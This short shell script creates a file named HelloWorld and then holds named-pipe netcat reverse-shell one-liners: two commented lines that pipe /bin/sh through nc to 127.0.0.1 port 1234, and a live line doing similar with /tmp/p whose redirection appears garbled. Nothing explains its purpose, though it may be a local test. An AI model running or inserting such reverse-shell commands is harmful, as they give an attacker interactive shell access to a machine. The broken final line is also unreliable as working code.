touch HelloWorld
#rm /tmp/backpipe ; mknod /tmp/backpipe p
#/bin/sh 0</tmp/backpipe | nc 127.0.0.1 1234 1>/tmp/backpipe&

rm -f /tmp/p; mknod /tmp/p p && nc 127.0.0.1 1234 0/tmp/p
